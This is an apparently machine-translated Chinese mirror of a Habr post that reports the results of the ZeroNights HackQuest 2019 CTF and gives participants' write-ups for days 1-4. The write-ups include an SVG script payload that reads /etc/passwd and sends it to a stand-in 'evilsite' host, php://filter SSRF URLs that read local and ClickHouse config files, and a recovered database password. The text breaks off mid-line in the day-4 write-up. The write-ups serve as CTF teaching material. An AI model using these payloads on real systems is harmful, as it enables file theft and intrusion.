<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>👨🏿‍🔬 🥑 👩🏻‍💻 ZeroNights Hackquest2019。结果与写作 😲 🤳 👩‍👧‍👧</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="最近，定时与ZeroNights会议同期举行的一年一度的HackQuest已经结束。 与往年一样，参与者必须解决7个不同的任务-一项任务是一天的任务。 一如既往，作业有助于我们的社区合作伙伴做好准备。 您可以了解如何解决任务，以及这次是谁成为了hackquest的赢家。 


 第一天。 
 优胜者...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>ZeroNights Hackquest2019。结果与写作</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/472416/"><p>最近，定时与ZeroNights会议同期举行的一年一度的HackQuest已经结束。 与往年一样，参与者必须解决7个不同的任务-一项任务是一天的任务。 一如既往，作业有助于我们的社区合作伙伴做好准备。 您可以了解如何解决任务，以及这次是谁成为了hackquest的赢家。 </p><br><img src="https://habrastorage.org/webt/fg/tn/kk/fgtnkkl6yedcvzkmsnb_koppplo.jpeg" alt="图片"><br><a name="habracut"></a><br><h2> 第一天。 </h2><br><div class="scrollable-table"><table><tbody><tr><td colspan="3" align="center"> 优胜者 </td></tr><tr><td align="center">  <b>第一名</b> </td><td align="center">  <b>第二名</b> </td></tr><tr><td align="center"> 弗拉德维斯 </td><td align="center">  Godaswag </td></tr></tbody></table></div><br><p> 今年的第一份工作是由<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">数字安全</a>审核小组准备的。 为了解决这个问题，参与者必须经历三个阶段：访问游戏门户的内部聊天内容，利用Discord bot中的漏洞，以及在Kubernetes集群中使用错误的权限设置。 </p><br><div class="spoiler">  <b class="spoiler_title">第一天任务的决定（vladvis）</b> <div class="spoiler_text"><h2> 第一步：graphql </h2><br><ul><li> 最初，我们进入具有js客户端游戏和评分的Web应用程序。 <br><img src="https://habrastorage.org/getpro/habr/post_images/9cf/5f7/9b1/9cf5f79b1b46572ab7a9672cd2aab2b1.png"></li><li> 除静态外，仅向后端发出1个请求： <br><img src="https://habrastorage.org/getpro/habr/post_images/751/d40/d27/751d40d27d15215ce845b84c9a9a9c06.png"></li><li> 您可以使用以下查询获取所有类型及其字段的列表： <br><pre><code class="plaintext hljs">{ __schema { types { name fields { name } } } }</code> </pre> </li><li> 我们将看到注释字段，在初始请求中对其进行请求，并获得指向下一步的链接。 </li></ul><br><h2> 第二步：Discord机器人 </h2><br><ul><li> 机器人在服务器上遇到我们并为我们创建一个单独的渠道 <br><img src="https://habrastorage.org/getpro/habr/post_images/956/219/d71/956219d717f189f25cc3a61c749a8c18.png"></li><li> 随即，我们在gitea中看到了SSRF的提示，但我从未想到过=（ </li><li> 我们尝试读取本地文件： <br><pre> <code class="plaintext hljs">&lt;svg width="10cm" height="3cm" viewBox="0 0 1000 300" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"&gt; &lt;script type="text/javascript"&gt; for (var i=0; trefs[i]; i++) { var xhr = new XMLHttpRequest(); xhr.open("GET","/etc/passwd",false); xhr.send(""); var xhr2 = new XMLHttpRequest(); xhr2.open("GET", "http://evilsite/?p="+btoa(xhr.responseText),false); xhr2.send(""); } &lt;/script&gt; &lt;/svg&gt;</code> </pre> </li><li> 我们得到/ etc / passwd并看到2个用户：worker，代表svg和gitea呈现 <br><pre> <code class="plaintext hljs">worker:x:1000:1000::/home/worker:/bin/sh gitea:x:1001:1001::/home/gitea:/bin/sh</code> </pre> </li><li> 这一步我经历了一条意外的路径：在.bash_history中，工作程序具有指向ssh密钥的路径以及到下一阶段的服务器地址。 <br><pre> <code class="plaintext hljs">cd nano .ssh/connect_info echo &gt; .bash_history exit cd cd .ssh/ chmod 755 id_rsa ls -al cat id_rsa exit</code> </pre> <br><h2> 第三步：kubernetes </h2></li><li> 看来我先进入了这个阶段。  .bash_history和ps为空，因此我得出结论，对于每个IP，都会创建一个隔离的环境 <br><img src="https://habrastorage.org/getpro/habr/post_images/225/584/a43/225584a43fca0887057424b64a1ee1b4.jpg"></li><li> 在mount中找到了kubernetes的令牌 <br><img src="https://habrastorage.org/getpro/habr/post_images/4d5/d0b/87e/4d5d0b87ed9b52c107a3d536cfb07f08.png"></li><li> 最初不清楚在哪里获得令牌，然后我开始扫描网格...然后在某个时候，我开始走进云中的邻居 </li><li> 此后，发出了要扫描的子网的提示，并且几乎立即发现了其余的api kubernetes。 </li><li> 在这一点上，我意识到我并不孤单在服务器上，也不想削减某些东西，例如遮罩cmdline，所以我决定这样做 <del> 更容易 </del> 这是更痛苦的，并通过ssh转发给自己的袜子代理 </li><li> 使用<code>kubectl get pods</code> ， <code>kubectl get pods</code>了一个容器列表，并且<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">kubernetes文档</a>建议exec可以使用与<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">docker</a>相同的语法 </li><li> 然后，袜子代理遭受了1.5个小时的苦难，高管的websocket却没有上升。 我最终通过ssh直接去了kubectl <br><img src="https://habrastorage.org/getpro/habr/post_images/f49/096/be8/f49096be8b3c769802f612325f70e7ba.png"></li><li> 第二个容器具有一个新令牌，并且它已经可以访问相邻命名空间zn2中的群集（最初我们在命名空间zn1中），从中可以看到redis </li><li> 我们回想起过去Zeronights的<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">报告</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">@paulaxe</a> ，并使用<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">此PoC</a>获得了RCE，例如 </li><li> 收到下一个令牌后，您可以从kubernetes机密中提取该标志 <br><img src="https://habrastorage.org/getpro/habr/post_images/71e/49d/172/71e49d172f647b8311233e5646dd9170.png"></li></ul></div></div><br><h2> 第2天。MICOSOFTLUNIX </h2><br><div class="scrollable-table"><table><tbody><tr><td colspan="3" align="center"> 优胜者 </td></tr><tr><td align="center">  <b>第一名</b> </td><td align="center">  <b>第二名</b> </td><td align="center">  <b>第三名</b> </td></tr><tr><td align="center"> 撕裂 </td><td align="center"> 罪__ </td><td align="center">  AV1ct0r </td></tr><tr><td colspan="3" align="center"> 还决定：demidov_al，gotdaswag，medidrdrider，groke_is_love_groke_is_life </td></tr></tbody></table></div><br><p> 第二天的任务是由<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">r0 Crew</a>社区的成员准备的。 要解决此问题，您需要为内核已修改的Linux映像生成激活密钥。 </p><br><div class="spoiler">  <b class="spoiler_title">第二天任务的决定（撕毁）</b> <div class="spoiler_text"><p> 给定： <code>jD74nd8_task2.iso</code>文件，可启动ISO映像。 从映像中的文件中，我们可以假定它是Linux：有一个内核<code>boot/kernel.xz</code> ，一个初始ramdisk <code>boot/rootfs.xz</code>和一个boot loader <code>boot/syslinux/</code> <code>boot/rootfs.xz</code> <code>boot/syslinux/</code> 。 </p><br><p> 我们正在尝试解压缩核心和虚拟磁盘。  Ramdisk是由xz压缩的常规cpio归档文件。 使用脚本<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux</a>解压缩内核。 您还可以注意内核信息： </p><br><pre> <code class="plaintext hljs">&gt; file kernel.xz kernel.xz: Linux kernel x86 boot executable bzImage, version 5.0.11 (billy@micosoft.com) #1 SMP Sat Aug 25 13:37:00 CEST 2019, RO-rootFS, swap_dev 0x2, Normal VGA</code> </pre> <br><p> 在此过程中，我们在iso映像中发现了<code>minimal/rootfs/bin/activator</code>的主要任务：一切归结为将输入的电子邮件数据和激活密钥以<code>$email|$key</code>格式写入设备<code>/dev/activate</code> 。 如果成功进行了密钥检查，则从<code>/dev/activate</code>读取将产生<code>ACTIVATED</code>行，在这种情况下，激活器将开始游戏2048。 </p><br><p> 现在该来看一下动态任务了。 为此，请在KVM中运行仿真器： </p><br><pre> <code class="plaintext hljs">&gt; qemu-system-x86_64 -enable-kvm -drive format=raw,media=cdrom,readonly,file=jD74nd8_task2.iso</code> </pre> <br><p>  Linux启动并立即从覆盖启动<code>/bin/activator</code> 。 这是在<code>/etc/inittab</code>阐明的。 为了避免长时间深入二进制游戏，我想获取一个shell并至少查看<code>/proc</code>和<code>/sys</code> 。 对我而言，最简单的方法是将iso文件简单地上传到激活程序脚本本身所在的位置。 代替<code>sleep 1</code> set <code>/bin/sh</code> ，即 每次尝试输入序列号后，我都会收到一个外壳。 </p><br><p> 所以有一个外壳：我们看起来<code>/proc/kallsyms</code>不存在，即 缺少内核字符。 当然，有了它们，速度会快得多，但是没关系。 我们正在寻找有关device <code>/dev/activator</code> ： </p><br><pre> <code class="plaintext hljs">/ # ls -la /dev/activate crw------- 1 0 0 252, 0 Oct 15 08:57 /dev/activate / # cat /proc/devices Character devices: ... 252 activate ... Block devices: ...</code> </pre> <br><p> 从<code>/proc/devices</code>的信息可以看出，这是具有主要版本252和次要0的char设备。 </p><br><p> 现在是时候在内核二进制文件中找到该设备的注册功能，以查找其<code>write</code>操作的处理程序了。 为此，找到对字符串<code>activate</code>交叉引用。 但是内核中没有这样的代码行，可能是某种程度上被隐藏了。 </p><br><p> 在下一个尝试中，我们尝试找到负责注册字符设备的函数： <code>cdev_add</code>和<code>register_chrdev</code> 。 可以通过交叉引用<code>/dev/console</code>或任何其他字符设备并获取内核源代码来完成（我使用的版本是5.0.11，但不确定该版本是否正确）。 查看了正在注册的设备的列表之后，我们没有找到具有主版本252的设备，这两个功能很可能没有注册。 </p><br><p> 让我们尝试寻找动态方面的其他线索： </p><br><pre> <code class="plaintext hljs">/ # ls -la /sys/dev/char/252:0 lrwxrwxrwx 1 0 0 0 Oct 15 09:00 /sys/dev/char/252:0 -&gt; ../../devices/virtual/EEy????I/activate</code> </pre> <br><p> 这是要<code>EEy????I</code>的<code>EEy????I</code>设备<code>EEy????I</code> 我们尝试在二进制中找到这条线，它在那里！ </p><br><p><img src="https://habrastorage.org/webt/ww/2x/pa/ww2xpaeiblwxlyive4ytkkdp4iq.png"></p><br><p> 尽管未找到对它的交叉引用，但在它旁边是类似于字符串的可见数据。 如果查看使用它们的代码，则可以看到它们是<code>activate</code>设备所需的读写处理程序，并通过简单的XOR进行了加密。 </p><br><p> 读取处理功能： </p><br><p><img src="https://habrastorage.org/webt/wr/gj/le/wrgjlelw6zor474zwwy2eins8zw.png"></p><br><p> 处理写操作的功能，它也是许可证检查： </p><br><p><img src="https://habrastorage.org/webt/go/sh/vm/goshvmqukonyiv69nltp_g9xrlw.png"></p><br><p> 快速检查激活验证码表明，最简单的方法是在地址<code>0xFFFFFFFF811F094B</code>处放置一个断点，然后在此处提取激活码，而无需真正研究那里发生的事情。 为此，请使用<code>-s</code>标志运行qemu。 在这种情况下，qemu运行gdb存根，这使您可以使用任何gdb客户端。 如果您具有许可证，则在IDA Pro中最简单，最快的方法。 但是没有人禁止在控制台gdb中做所有事情。 </p><br><p> 我们按照官方<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">教程中的说明进行所有操作</a> 。 现在，您需要在已经运行的内核中找到处理功能。 </p><br><p><img src="https://habrastorage.org/webt/ql/cc/f1/qlccf1qgfqvp3mimbbuyazih4de.png"></p><br><p><img src="https://habrastorage.org/webt/jh/ui/br/jhuibrua89zngguxpedg0oco8h8.png"></p><br><p> 由于内核是使用KASLR支持构建的，因此正在运行的内核的地址将移至每次内核启动时都会生成的随机偏移量。 我们计算该偏移量（我们在调试内核的代码中获取唯一字节序列的地址，然后从二进制中减去该序列的地址），然后将激活函数添加到该地址，然后在内存中找到它。 一切，现在取决于规模。 设置一个断点并获取代码。 </p><br><p><img src="https://habrastorage.org/webt/ef/yp/vg/efypvgwh0kyc2zi999ucriitvt8.png"></p><br><p><img src="https://habrastorage.org/webt/nt/ny/wa/ntnywaix5hh2hptggey0gk9a8fi.png"></p><br><p><img src="https://habrastorage.org/webt/q4/4c/tm/q44ctmpm3uzgmm_9tigzw9us4a0.png"></p></div></div><br><p> 参与者之一已经在中心发布了此任务的解决方案。 您可以<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">在这里</a>熟悉它。 </p><br><h2> 第3天。 </h2><br><div class="scrollable-table"><table><tbody><tr><td align="center"> 优胜者 </td></tr><tr><td align="center">  <b>第一名</b> </td></tr><tr><td align="center"> 黑风扇 </td></tr></tbody></table></div><br><p> 通过beched（ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">DeteAct</a> ）准备的作业。 不平凡的付款页面向与会人员表示欢迎。 对于该解决方案，必须使用php函数<code>file_get_contents</code>的功能访问Clickhouse数据库。 </p><br><div class="spoiler">  <b class="spoiler_title">第三天任务的决定（blackfan）</b> <div class="spoiler_text"><p> 任务是付款页面，其中唯一有趣的参数是callback_url。 </p><br><p><img src="https://habrastorage.org/getpro/habr/post_images/c6c/428/f02/c6c428f02a3ea33075cbe0d5d556ace8.png" alt="https://i.imgur.com/iX65TI3.png"></p><br><p> 我们指出您的网站并捕获请求： </p><br><pre> <code class="plaintext hljs">http://82.202.226.176/?callback_url=http://attacker.tld/&amp;pan=&amp;amount=&amp;payment_id=</code> </pre> <br><pre> <code class="plaintext hljs">POST / HTTP/1.0 Host: attacker.tld Connection: close Content-Length: 21 Content-Type: application/json amount=0&amp;payment_id=0</code> </pre> <br><p> 仅当站点返回字母数字字符串时，才会显示HTTP响应。 答案示例： </p><br><pre> <code class="plaintext hljs">{"result":"Success.","msg":"Response: testresponse"} {"result":"Invalid status code.","msg":"Non-alphanumeric response."}</code> </pre> <br><p> 我们以callback_url data的形式尝试：，测试并了解，很可能是PHP。 </p><br><pre> <code class="plaintext hljs">http://82.202.226.176/?callback_url=data:,test&amp;pan=&amp;amount=&amp;payment_id=</code> </pre> <br><p> 我们使用php：//过滤器读取本地文件，并使用convert.base64-encode对响应进行编码，以使答案与字母数字匹配。 由于字符+，/和=，有时需要组合几个base64调用来显示答案。 </p><br><pre> <code class="plaintext hljs">http://82.202.226.176/?pan=xxx&amp;amount=xxx&amp;payment_id=xxx&amp;callback_url=php://filter/convert.base64-encode|convert.base64-encode/resource=./index.php http://82.202.226.176/?pan=xxx&amp;amount=xxx&amp;payment_id=xxx&amp;callback_url=php://filter/convert.base64-encode|convert.base64-encode/resource=./includes/db.php</code> </pre> <br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> error_reporting(<span class="hljs-number"><span class="hljs-number">0</span></span>); <span class="hljs-comment"><span class="hljs-comment">/* * DB configuration */</span></span> $config = [ <span class="hljs-string"><span class="hljs-string">'host'</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">'localhost'</span></span>, <span class="hljs-string"><span class="hljs-string">'port'</span></span></code> </pre> <br><p> 响应输出限制为200个字节，但是从这些片段中，我们了解了本地主机上数据库的可用性。 我们通过callback_url对端口进行排序，并<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">在DeteAct博客的ClickHouse中</a>找到<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">有关注入</a>的<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">新文章</a> ，该文章与奇怪的任务名称“ HOUSE OF BECHED”相对应。 </p><br><p><img src="https://habrastorage.org/getpro/habr/post_images/5fb/f00/b42/5fbf00b42a4499e928edfd469a81e755.png" alt="https://i.imgur.com/OBn22wi.png"></p><br><p>  ClickHouse具有一个HTTP接口，允许您执行任意请求，这在SSRF中使用非常方便。 </p><br><p> 我们阅读了文档，尝试从配置中获取一个帐户。 </p><br><pre> <code class="plaintext hljs">http://82.202.226.176/?callback_url=php://filter/convert.base64-encode|convert.base64-encode/resource=/etc/clickhouse-server/users.xml&amp;pan=&amp;amount=&amp;payment_id=</code> </pre> <br><pre> <code class="xml hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?xml version="1.0"?&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">yandex</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-comment"><span class="hljs-comment">&lt;!-- Profiles of settings. --&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">profiles</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-comment"><span class="hljs-comment">&lt;!-- Default settibm</span></span></code> </pre> <br><p> 同样，限制输出干扰，并根据标准文件判断，所需字段距离非常远。 </p><br><p><img src="https://habrastorage.org/getpro/habr/post_images/6e8/6f9/35f/6e86f935fc695b845a63aebbbcd76626.png" alt="https://i.imgur.com/5Un6gfj.png"></p><br><p> 使用string.strip_tags过滤器减少多余的部分。 </p><br><pre> <code class="plaintext hljs">http://82.202.226.176/?callback_url=php://filter/string.strip_tags|convert.base64-encode/resource=/etc/clickhouse-server/users.xml&amp;pan=&amp;amount=&amp;payment_id=</code> </pre> <br><p> 但是直到收到密码后，输出长度仍然不够。 添加一个压缩过滤器zlib.deflate。 </p><br><pre> <code class="plaintext hljs">http://82.202.226.176/?callback_url=php://filter/string.strip_tags|zlib.deflate|convert.base64-encode|convert.base64-encode/resource=/etc/clickhouse-server/users.xml&amp;pan=&amp;amount=&amp;payment_id=</code> </pre> <br><p> 并以相反的顺序在本地读取： </p><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">print</span></span>(file_get_contents(<span class="hljs-string"><span class="hljs-string">'php://filter/convert.base64-decode|convert.base64-decode|zlib.inflate/resource=data:,NCtYaTVWSUFBbVFTRnd1VFoyZ0FCN3hjK0JRU2tDNUt6RXZKejBXMms3QkxETkVsZUNueVNsSnFja1pxU2taK2FYRnFYbjVHYW1JQmZoZWo4a0RBeWtyZkFGME5QajBwcVdtSnBUa2xWRkNFNlJaTUVWSkZRU0JSd1JZNWxGRTFVY3NLYllVa0JiV2NFbXNGUTRYOElv'</span></span>));</code> </pre> <br><p> 收到密码后，我们可以按以下方式发送ClickHouse请求： </p><br><pre> <code class="plaintext hljs">http://localhost:8123/?query=select%20'xxx'&amp;user=default&amp;password=bechedhousenoheap http://default:bechedhousenoheap@localhost:8123/?query=select%20'xxx'</code> </pre> <br><p> 但是由于我们最初发送POST，所以我们需要使用重定向解决此问题。 最终的请求结果是这样的（在此阶段，我非常笨，因为由于大量嵌套的参数处理，我不正确地编码了特殊字符并且无法执行请求） </p><br><pre> <code class="plaintext hljs">http://82.202.226.176/?callback_url=php://filter/convert.base64-encode|convert.base64-encode|convert.base64-encode/resource=http://blackfan.ru/x?r=http://localhost:8123/%253Fquery=select%252520'xxx'%2526user=default%2526password=bechedhousenoheap&amp;pan=&amp;amount=&amp;payment_id=</code> </pre> <br><p> 好了，那就从数据库中获取数据： </p><br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">select</span></span> <span class="hljs-keyword"><span class="hljs-keyword">name</span></span> <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> system.tables <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> <span class="hljs-keyword"><span class="hljs-keyword">name</span></span> <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> system.columns <span class="hljs-keyword"><span class="hljs-keyword">where</span></span> <span class="hljs-keyword"><span class="hljs-keyword">table</span></span>=<span class="hljs-string"><span class="hljs-string">'flag4zn'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> bechedflag <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> flag4zn</code> </pre> <br><pre> <code class="plaintext hljs">http://82.202.226.176/?callback_url=php://filter/convert.base64-encode|convert.base64-encode|convert.base64-encode/resource=http://blackfan.ru/x?r=http://localhost:8123/%253Fquery=select%252520bechedflag%252520from%252520flag4zn%2526user=default%2526password=bechedhousenoheap&amp;pan=&amp;amount=&amp;payment_id=</code> </pre> </div></div><br><h2> 第4天。ASR-EHD </h2><br><div class="scrollable-table"><table><tbody><tr><td align="center"> 优胜者 </td></tr><tr><td align="center">  <b>第一名</b> </td></tr><tr><td align="center">  AV1ct0r </td></tr></tbody></table></div><br><p> 第四天的任务是由<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">数字安全</a>研究部门准备的。 任务的主要任务是展示对随机数源的错误选择如何影响加密算法。 在taskka中，基于LFSR实现了用于DH的自写随机私钥生成器。 使用公共DH值接收到足够数量的连续TLS握手后，便可以恢复LFSR的初始状态并解密所有流量。 </p><br><div class="spoiler">  <b class="spoiler_title">第四天任务的决定（AV1ct0r）</b> <div class="spoiler_text"><h1 id="day-4--asr-ehd--writeup-by-av1ct0r"> 第4天/ ASR-EHD-由AV1ct0r撰写 </h1><br><p> 彼得有点偏执：他总是使用加密连接。 为确保算法安全，Peter使用了自己的客户端。 他甚至给了我们一个使用他的自定义客户端时进行的流量转储。 彼得的联系真的很安全吗？ </p><br><p>  <a href="">https://hackquest.zeronights.org/downloads/task4/8Jdl3f_client.tar</a> <br>  <a href="">https://hackquest.zeronights.org/downloads/task4/d8f3ND_dump.tar</a> </p><br><ol><li><p> 在IDA Pro中打开客户端文件，并查看它可以从服务器<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">https://ssltest.a1exdandy.me:443/</a>下载标志文件的一部分。 从命令行获取要下载文件的哪一部分（从哪个字节开始）。 </p><br><pre> <code class="plaintext hljs">signed __int64 __fastcall main(int argc, char **argv, char **a3) { size_t v4; // rsi __int64 v5; // ST48_8 int v6; // [rsp+10h] [rbp-450h] int v7; // [rsp+14h] [rbp-44Ch] __int64 v8; // [rsp+20h] [rbp-440h] __int64 v9; // [rsp+28h] [rbp-438h] __int64 v10; // [rsp+30h] [rbp-430h] __int64 v11; // [rsp+38h] [rbp-428h] __int64 v12; // [rsp+40h] [rbp-420h] char ptr; // [rsp+50h] [rbp-410h] unsigned __int64 v14; // [rsp+458h] [rbp-8h] v14 = __readfsqword(0x28u); if ( argc != 3 ) return 0xFFFFFFFFLL; v6 = atoi(argv[1]); v7 = atoi(argv[2]); if ( v6 &lt; 0 || v7 &lt; 0 || v7 &lt;= v6 ) return 0xFFFFFFFFLL; v8 = 0LL; v9 = 0LL; v10 = 0LL; OPENSSL_init_ssl(0LL, 0LL); OPENSSL_init_crypto(2048LL, 0LL); v11 = ENGINE_get_default_DH(2048LL, 0LL); if ( v11 ) { if ( (unsigned int)ENGINE_init(v11) ) { v12 = ENGINE_get_DH(v11); if ( v12 ) { v8 = DH_meth_dup(v12); if ( v8 ) { if ( (unsigned int)DH_meth_set_generate_key(v8, dh_1) ) { if ( (unsigned int)ENGINE_set_DH(v11, v8) ) { v5 = TLSv1_2_client_method(v11, v8); v10 = SSL_CTX_new(v5); if ( (unsigned int)SSL_CTX_set_cipher_list(v10, "DHE-RSA-AES128-SHA256") ) { v9 = BIO_new_ssl_connect(v10); BIO_ctrl(v9, 100LL, 0LL, (__int64)"ssltest.a1exdandy.me:443"); if ( BIO_ctrl(v9, 101LL, 0LL, 0LL) &gt;= 0 ) { BIO_ctrl(v9, 101LL, 0LL, 0LL); BIO_printf(v9, "GET /flag.jpg HTTP/1.1\n", argv); BIO_printf(v9, "Host: ssltest.a1exdandy.me\n"); BIO_printf(v9, "Range: bytes=%d-%d\n\n", (unsigned int)v6, (unsigned int)v7); v4 = (signed int)BIO_read(v9, &amp;ptr, 1024LL); fwrite(&amp;ptr, v4, 1uLL, stdout); } else { v4 = 1LL; fwrite("Can't do connect\n", 1uLL, 0x11uLL, stderr); } } else { v4 = 1LL; fwrite("Can't set cipher list\n", 1uLL, 0x16uLL, stderr); } } else { v4 = 1LL; fwrite("Can't set DH methods\n", 1uLL, 0x15uLL, stderr); } } else { v4 = 1LL; fwrite("Can't set generate_key method\n", 1uLL, 0x1EuLL, stderr); } } else { v4 = 1LL; fwrite("Can't dup dh meth\n", 1uLL, 0x12uLL, stderr); } } else { v4 = 1LL; fwrite("Can't get DH\n", 1uLL, 0xDuLL, stderr); } } else { v4 = 1LL; fwrite("Can't init engine\n", 1uLL, 0x12uLL, stderr); } } else { v4 = 1LL; fwrite("Can't get DH\n", 1uLL, 0xDuLL, stderr); } if ( v11 ) { ENGINE_finish(v11, v4); ENGINE_free(v11); } if ( v8 ) DH_meth_free(v8, v4); if ( v10 ) SSL_CTX_free(v10, v4); if ( v9 ) BIO_free_all(v9, v4); return 0LL; }</code> </pre> <br><p> 服务器上没有带有该标志的图片，但是dump.pcap原来有大量的ssl流量，大概是图片的一部分。 快速检查服务器是否出现故障（窃取用于解密流量的私钥）后，发现该服务器不容易受到攻击。 此外，在SSL会话中，根据流量转储和客户端，使用DHE-RSA-AES128-SHA256密码，其中RSA仅用于签名，并且密钥根据Diffie-Hellman方案进行交换（此模式下的专用RSA服务器密钥无济于事） </p><br></li><li><p> 服务器略带podirbastiv，找到了一个简单的恶意软件文件<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">https://ssltest.a1exdandy.me/x</a> ，缝入其中的管理员地址为0x82C780B2697A0002（0x82C780B2：0x7a69 = 178.128.199.130 opin1337）。 当连接到端口31337时，发现服务器支持3个命令，其中一些命令要求其他参数 </p><br><pre> <code class="plaintext hljs">nc 178.128.199.130 31337 Yet another fucking heap task... Command: 1-3 1 - Index: - Size: 2 - Index: 3 - Index: - Length:</code> </pre> <br><p> 但是，使用此端口无法做进一步的工作，这很可能是一项分心的任务。 </p><br></li><li><p> 在仔细查看了客户端之后，我看到它使用了自定义的Diffie-Hellman机密生成器： </p><br><pre> <code class="plaintext hljs">int __fastcall rnd_work(__int64 a1) { __int64 v1; // rsi unsigned int i; // [rsp+10h] [rbp-10h] rnd_read(); BN_bin2bn(&amp;RANDOM_512, 512LL, a1); BN_lshift1(a1, a1); v1 = (unsigned int)BITS_ind[0]; // BITS_ind dd 4096, 4095, 4081, 4069, 0 if ( (unsigned int)BN_is_bit_set(a1, (unsigned int)BITS_ind[0]) ) { for ( i = 0; i &lt;= 4; ++i ) { if ( (unsigned int)BN_is_bit_set(a1, (unsigned int)BITS_ind[i]) ) { v1 = (unsigned int)BITS_ind[i]; BN_clear_bit(a1, v1); } else { v1 = (unsigned int)BITS_ind[i]; BN_set_bit(a1, v1); } } } if ( (unsigned int)((signed int)((unsigned __int64)BN_num_bits(a1) + 7) / 8) &gt; 0x200 ) { printf("Err!", v1); exit(0); } BN_bn2binpad(a1, &amp;RANDOM_512, 512LL); return rnd_write(); }</code> </pre> <br><p> 最初，从/ dev / urandom中读取机密（512字节）并将其保存到状态文件中。 对于每个后续请求，以下秘密都会发生： </p><br><pre> <code class="plaintext hljs">XOR = 